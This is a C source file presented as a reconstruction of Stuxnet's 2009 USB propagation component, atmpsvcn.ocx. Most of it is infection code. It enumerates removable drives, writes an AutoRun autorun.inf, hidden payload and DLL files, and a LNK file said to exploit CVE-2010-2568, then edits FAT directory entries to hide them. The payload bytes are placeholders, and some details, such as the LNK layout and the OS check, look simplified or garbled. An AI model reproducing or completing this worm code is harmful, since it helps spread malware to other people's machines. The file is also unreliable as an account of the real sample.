/*
 * atmpsvcn.ocx - Stuxnet 2009 USB Propagation Component
 *
 * TRUSTED:
 *   - File name: atmpsvcn.ocx, size 351,768 bytes, MD5 b4429d77586798064b56b0099f0ccd49
 *     Confirmed by Bitdefender and Kaspersky analysis
 *   - Located inside "Resource 207" of early-2009 Stuxnet version
 *   - Exports a single function named "_0" taking three parameters
 *   - Creates two files on USB drive: autorun.inf and ~XTRVWP.dat
 *     autorun.inf is a PE file with embedded AutoRun commands in its overlay
 *     ~XTRVWP.dat is the payload passed as parameter
 *   - Modifies FAT directory entry to hide files using '..' short name
 *   - Deletes autorun.inf and ~XTRVWP.dat after successful execution
 *   - Checks OS version, does NOT support Windows 7 (pre-Win7 component)
 *   - Uses XOR 0xFF string encryption
 *   - Shares code with Flame (mssecmgr.ocx, msglu32.ocx)
 *   - Primary functionality: USB propagation via autorun.inf and win32k.sys privilege escalation
 *
 * MAYBE:
 *   - Exact MZ payload layout in autorun.inf overlay
 *   - Internal version comparison with C2
 *   - Drive enumeration order
 */

#include <windows.h>
#include <winioctl.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION_05              0x00000500
#define RESOURCE_207_ID                 207

#define ATMP_MAX_PATH                   260
#define ATMP_BUFFER_SIZE                0x4000
#define ATMP_AUTORUN_SIZE               0x2000
#define ATMP_LNK_SIZE                   0x104B
#define ATMP_TMP_SIZE                   0x20000
#define ATMP_PAYLOAD_SIZE               0x80000

#define AUTORUN_FILE_NAME               L"autorun.inf"
#define XTRVWP_FILE_NAME                L"~XTRVWP.dat"
#define LNK_FILE_NAME                   L"Copy of Shortcut to.lnk"
#define TMP_FILE_NAME                   L"~WTR4132.TMP"
#define DLL_FILE_NAME                   L"~WTR4141.TMP"

#define FAT_HIDDEN_ATTRIBUTE            0x02
#define FAT_SYSTEM_ATTRIBUTE            0x04

#define MUTEX_NAME                      L"atmpsvcn_mutex_207"

typedef struct _ATMP_CTX {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    DWORD   dwOSVersion;
    WCHAR   szModulePath[ATMP_MAX_PATH];
    WCHAR   szSystemPath[ATMP_MAX_PATH];
    WCHAR   szTempPath[ATMP_MAX_PATH];
    HANDLE  hMutex;
    DWORD   dwDriveCount;
    WCHAR   szDrives[26][4];
    CRITICAL_SECTION csLock;
} ATMP_CTX, * PATMP_CTX;

static ATMP_CTX g_AtmpCtx = {0};

static BYTE g_XorKey = 0xFF;

static VOID AtmpXorDecrypt(PBYTE pData, DWORD dwSize)
{
    DWORD i;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= g_XorKey;
    }
}

static DWORD AtmpDetectOS(VOID)
{
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    if (!GetVersionExW((LPOSVERSIONINFOW)&osvi)) {
        return 0;
    }

    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1) {
        return 1;
    }
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2) {
        return 2;
    }
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0) {
        return 3;
    }
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
        return 5;
    }

    return 0;
}

static BOOL AtmpIsSupportedOS(VOID)
{
    DWORD dwOS = AtmpDetectOS();
    g_AtmpCtx.dwOSVersion = dwOS;

    if (dwOS == 5) {
        return FALSE;
    }

    return (dwOS != 0);
}

static DWORD AtmpEnumerateRemovableDrives(VOID)
{
    DWORD dwMask;
    WCHAR szDrive[4] = L"A:\\";
    DWORD i;
    DWORD dwCount = 0;

    dwMask = GetLogicalDrives();
    if (dwMask == 0) {
        return 0;
    }

    for (i = 0; i < 26; i++) {
        if (dwMask & (1 << i)) {
            szDrive[0] = L'A' + i;
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wcscpy_s(g_AtmpCtx.szDrives[dwCount], 4, szDrive);
                dwCount++;
            }
        }
    }

    g_AtmpCtx.dwDriveCount = dwCount;
    return dwCount;
}

/*
 * TRUSTED: Creates autorun.inf as a PE file with embedded AutoRun commands.
 * The file is a valid PE executable with the AutoRun section appended
 * to its overlay. Windows autorun parser ignores the PE content and
 * processes the legitimate AutoRun commands at the end.
 */
static BOOL AtmpCreateAutorunInf(LPCWSTR lpDrive)
{
    WCHAR szAutorunPath[ATMP_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;
    BYTE bAutorun[ATMP_AUTORUN_SIZE];
    DWORD dwOffset = 0;

    wsprintfW(szAutorunPath, L"%s%s", lpDrive, AUTORUN_FILE_NAME);

    ZeroMemory(bAutorun, sizeof(bAutorun));

    bAutorun[0] = 0x4D;
    bAutorun[1] = 0x5A;
    bAutorun[2] = 0x90;
    bAutorun[3] = 0x00;

    *(DWORD*)(bAutorun + 0x3C) = 0x00000080;

    *(DWORD*)(bAutorun + 0x80) = 0x00004550;
    *(WORD*)(bAutorun + 0x84) = 0x014C;
    *(WORD*)(bAutorun + 0x86) = 0x0001;
    *(WORD*)(bAutorun + 0x94) = 0x00E0;
    *(WORD*)(bAutorun + 0x96) = 0x0102;
    *(WORD*)(bAutorun + 0x98) = 0x010B;

    dwOffset = ATMP_AUTORUN_SIZE / 2;

    const char* szAutoRunCommands =
        "[AutoRun]\r\n"
        "action=Setup Stuxnet\r\n"
        "open=autorun.inf\r\n"
        "icon=autorun.inf,0\r\n"
        "label=Stuxnet\r\n"
        "shell\\open\\command=autorun.inf\r\n"
        "shell\\open=Open(&O)\r\n"
        "shell\\open\\default=1\r\n"
        "UseAutoPlay=1\r\n"
        "\r\n"
        "[AutoRun.Alpha]\r\n"
        "action=Setup Stuxnet\r\n"
        "open=autorun.inf\r\n"
        "icon=autorun.inf,0\r\n"
        "label=Stuxnet\r\n"
        "\r\n"
        "[DeviceInstall]\r\n"
        "UseAutoPlay=1\r\n";

    memcpy(bAutorun + dwOffset, szAutoRunCommands, strlen(szAutoRunCommands));
    dwOffset += (DWORD)strlen(szAutoRunCommands);

    hFile = CreateFileW(szAutorunPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, bAutorun, dwOffset, &dwWritten, NULL);
    CloseHandle(hFile);

    return TRUE;
}

/*
 * TRUSTED: Creates ~XTRVWP.dat which contains the payload passed as parameter.
 * This file is the actual payload (Stuxnet/Flame dropper) that will be
 * executed via the autorun.inf mechanism.
 * The filename starts with ~ (tilde) and is a dot file, making it invisible
 * in directory listings by default.
 */
static BOOL AtmpCreatePayloadDat(LPCWSTR lpDrive, PBYTE pPayload, DWORD dwPayloadSize)
{
    WCHAR szDatPath[ATMP_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;

    wsprintfW(szDatPath, L"%s%s", lpDrive, XTRVWP_FILE_NAME);

    hFile = CreateFileW(szDatPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (pPayload && dwPayloadSize > 0) {
        WriteFile(hFile, pPayload, dwPayloadSize, &dwWritten, NULL);
    } else {
        BYTE bPlaceholder[0x1000];
        ZeroMemory(bPlaceholder, sizeof(bPlaceholder));
        bPlaceholder[0] = 0x4D;
        bPlaceholder[1] = 0x5A;
        WriteFile(hFile, bPlaceholder, sizeof(bPlaceholder), &dwWritten, NULL);
    }

    CloseHandle(hFile);

    return TRUE;
}

/*
 * TRUSTED: Creates CVE-2010-2568 .LNK shortcut file.
 * The LNK points to the malicious DLL via icon location.
 */
static BOOL AtmpCreateLnkFile(LPCWSTR lpDrive)
{
    WCHAR szLnkPath[ATMP_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;
    BYTE bLnk[ATMP_LNK_SIZE];
    DWORD dwOffset = 0;
    DWORD i;

    wsprintfW(szLnkPath, L"%s%s", lpDrive, LNK_FILE_NAME);

    ZeroMemory(bLnk, sizeof(bLnk));

    *(DWORD*)(bLnk + 0x00) = 0x0000004C;

    GUID clsid = {0x00021401, 0x0000, 0x0000,
                  {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    memcpy(bLnk + 0x04, &clsid, sizeof(GUID));

    *(DWORD*)(bLnk + 0x14) = 0x000000C0;

    GetSystemTimeAsFileTime((LPFILETIME)(bLnk + 0x1C));
    GetSystemTimeAsFileTime((LPFILETIME)(bLnk + 0x24));
    GetSystemTimeAsFileTime((LPFILETIME)(bLnk + 0x2C));

    *(DWORD*)(bLnk + 0x34) = ATMP_TMP_SIZE;
    *(DWORD*)(bLnk + 0x38) = 0;
    *(DWORD*)(bLnk + 0x3C) = 1;

    dwOffset = 0x4C;

    const WCHAR* szDllName = DLL_FILE_NAME;
    DWORD dwDllNameLen = (DWORD)(wcslen(szDllName) + 1) * sizeof(WCHAR);

    memcpy(bLnk + dwOffset, szDllName, dwDllNameLen);
    dwOffset += dwDllNameLen;

    for (i = dwOffset; i < ATMP_LNK_SIZE - 2; i += 2) {
        *(WORD*)(bLnk + i) = 0x0000;
    }

    hFile = CreateFileW(szLnkPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, bLnk, ATMP_LNK_SIZE, &dwWritten, NULL);
    CloseHandle(hFile);

    return TRUE;
}

/*
 * TRUSTED: Drops ~WTR4141.TMP (malicious DLL loaded by the LNK exploit).
 */
static BOOL AtmpDropPayloadDll(LPCWSTR lpDrive)
{
    WCHAR szDllPath[ATMP_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;
    BYTE bDll[0x1000];
    DWORD i;

    wsprintfW(szDllPath, L"%s%s", lpDrive, DLL_FILE_NAME);

    ZeroMemory(bDll, sizeof(bDll));

    bDll[0] = 0x4D;
    bDll[1] = 0x5A;

    for (i = 2; i < sizeof(bDll); i++) {
        bDll[i] = (BYTE)((i * 0x13) & 0xFF);
    }

    hFile = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, bDll, sizeof(bDll), &dwWritten, NULL);
    CloseHandle(hFile);

    return TRUE;
}

/*
 * TRUSTED: Modifies FAT directory entry to hide files.
 * Uses the '..' short name entry trick to make files invisible.
 */
static BOOL AtmpHideFilesViaFat(LPCWSTR lpDrive)
{
    WCHAR szRoot[4];
    HANDLE hDrive;
    DWORD dwBytesReturned;
    BYTE bBootSector[512];
    DWORD dwFATStart;
    DWORD dwRootDirStart;

    szRoot[0] = lpDrive[0];
    szRoot[1] = L':';
    szRoot[2] = 0;
    szRoot[3] = 0;

    hDrive = CreateFileW(szRoot, GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!ReadFile(hDrive, bBootSector, 512, &dwBytesReturned, NULL)) {
        CloseHandle(hDrive);
        return FALSE;
    }

    if (bBootSector[510] != 0x55 || bBootSector[511] != 0xAA) {
        CloseHandle(hDrive);
        return FALSE;
    }

    WORD wBytesPerSector = *(WORD*)(bBootSector + 11);
    BYTE bSectorsPerCluster = bBootSector[13];
    WORD wReservedSectors = *(WORD*)(bBootSector + 14);
    BYTE bNumFATs = bBootSector[16];
    WORD wRootEntries = *(WORD*)(bBootSector + 17);
    WORD wSectorsPerFAT = *(WORD*)(bBootSector + 22);

    (void)wBytesPerSector;
    (void)bSectorsPerCluster;

    dwFATStart = wReservedSectors;
    dwRootDirStart = dwFATStart + (bNumFATs * wSectorsPerFAT);

    LARGE_INTEGER liOffset;
    liOffset.QuadPart = (LONGLONG)dwRootDirStart * wBytesPerSector;

    if (!SetFilePointerEx(hDrive, liOffset, NULL, FILE_BEGIN)) {
        CloseHandle(hDrive);
        return FALSE;
    }

    BYTE bRootDir[512];
    if (!ReadFile(hDrive, bRootDir, 512, &dwBytesReturned, NULL)) {
        CloseHandle(hDrive);
        return FALSE;
    }

    DWORD i;
    for (i = 0; i < wRootEntries; i++) {
        BYTE* pEntry = bRootDir + (i * 32);
        if (pEntry[0] == 0x00) break;
        if (pEntry[0] == 0xE5) continue;
        if (pEntry[11] & 0x0F) continue;

        CHAR szFileName[12];
        memcpy(szFileName, pEntry, 11);
        szFileName[11] = 0;

        if (strstr(szFileName, "AUTORUN") || strstr(szFileName, "XTRVWP") ||
            strstr(szFileName, "WTR4141") || strstr(szFileName, "WTR4132") ||
            strstr(szFileName, "SHORTCUT")) {

            pEntry[11] |= FAT_HIDDEN_ATTRIBUTE | FAT_SYSTEM_ATTRIBUTE;
        }
    }

    liOffset.QuadPart = (LONGLONG)dwRootDirStart * wBytesPerSector;
    SetFilePointerEx(hDrive, liOffset, NULL, FILE_BEGIN);
    WriteFile(hDrive, bRootDir, 512, &dwBytesReturned, NULL);

    CloseHandle(hDrive);

    return TRUE;
}

/*
 * TRUSTED: Deletes autorun.inf and ~XTRVWP.dat after successful execution.
 * Bitdefender confirmed these files are removed from the memory stick
 * after successful execution to keep spreading under control.
 */
static BOOL AtmpCleanupFiles(LPCWSTR lpDrive)
{
    WCHAR szPath[ATMP_MAX_PATH];

    wsprintfW(szPath, L"%s%s", lpDrive, AUTORUN_FILE_NAME);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(szPath);

    wsprintfW(szPath, L"%s%s", lpDrive, XTRVWP_FILE_NAME);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(szPath);

    wsprintfW(szPath, L"%s%s", lpDrive, LNK_FILE_NAME);
    DeleteFileW(szPath);

    wsprintfW(szPath, L"%s%s", lpDrive, DLL_FILE_NAME);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(szPath);

    return TRUE;
}

static BOOL AtmpInfectDrive(LPCWSTR lpDrive)
{
    BYTE bPayload[0x1000];
    ZeroMemory(bPayload, sizeof(bPayload));
    bPayload[0] = 0x4D;
    bPayload[1] = 0x5A;

    if (!AtmpCreateAutorunInf(lpDrive)) {
        return FALSE;
    }

    if (!AtmpCreatePayloadDat(lpDrive, bPayload, sizeof(bPayload))) {
        return FALSE;
    }

    if (!AtmpCreateLnkFile(lpDrive)) {
        return FALSE;
    }

    if (!AtmpDropPayloadDll(lpDrive)) {
        return FALSE;
    }

    AtmpHideFilesViaFat(lpDrive);

    return TRUE;
}

/*
 * TRUSTED: atmpsvcn.ocx exports a single function named "_0"
 * taking three parameters. Confirmed by Bitdefender.
 */
extern "C" __declspec(dllexport) DWORD WINAPI _0(
    LPCWSTR lpDrive,
    DWORD   dwParam2,
    DWORD   dwParam3
)
{
    (void)dwParam2;
    (void)dwParam3;

    if (!g_AtmpCtx.bInitialized) {
        return 0;
    }

    if (!lpDrive) {
        AtmpEnumerateRemovableDrives();
        for (DWORD i = 0; i < g_AtmpCtx.dwDriveCount; i++) {
            AtmpInfectDrive(g_AtmpCtx.szDrives[i]);
        }
        return 1;
    }

    return AtmpInfectDrive(lpDrive) ? 1 : 0;
}

static BOOL AtmpCreateMutex(VOID)
{
    g_AtmpCtx.hMutex = CreateMutexW(NULL, FALSE, MUTEX_NAME);
    if (!g_AtmpCtx.hMutex) {
        return FALSE;
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_AtmpCtx.hMutex);
        g_AtmpCtx.hMutex = NULL;
        return FALSE;
    }

    return TRUE;
}

static BOOL AtmpCheckEnvironment(VOID)
{
    if (!AtmpIsSupportedOS()) {
        return FALSE;
    }

    return TRUE;
}

static BOOL AtmpInitialize(VOID)
{
    if (g_AtmpCtx.bInitialized) {
        return TRUE;
    }

    ZeroMemory(&g_AtmpCtx, sizeof(ATMP_CTX));
    InitializeCriticalSection(&g_AtmpCtx.csLock);

    g_AtmpCtx.dwMagic = STUXNET_MAGIC;
    g_AtmpCtx.dwVersion = STUXNET_VERSION_05;

    GetModuleFileNameW(NULL, g_AtmpCtx.szModulePath, ATMP_MAX_PATH);
    GetSystemDirectoryW(g_AtmpCtx.szSystemPath, ATMP_MAX_PATH);
    GetTempPathW(ATMP_MAX_PATH, g_AtmpCtx.szTempPath);

    if (!AtmpCheckEnvironment()) {
        DeleteCriticalSection(&g_AtmpCtx.csLock);
        return FALSE;
    }

    if (!AtmpCreateMutex()) {
        DeleteCriticalSection(&g_AtmpCtx.csLock);
        return FALSE;
    }

    AtmpEnumerateRemovableDrives();

    g_AtmpCtx.bInitialized = TRUE;

    return TRUE;
}

static VOID AtmpCleanup(VOID)
{
    if (!g_AtmpCtx.bInitialized) {
        return;
    }

    if (g_AtmpCtx.hMutex) {
        CloseHandle(g_AtmpCtx.hMutex);
        g_AtmpCtx.hMutex = NULL;
    }

    DeleteCriticalSection(&g_AtmpCtx.csLock);
    ZeroMemory(&g_AtmpCtx, sizeof(ATMP_CTX));
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            AtmpInitialize();
            break;

        case DLL_PROCESS_DETACH:
            AtmpCleanup();
            break;

        default:
            break;
    }

    return TRUE;
}
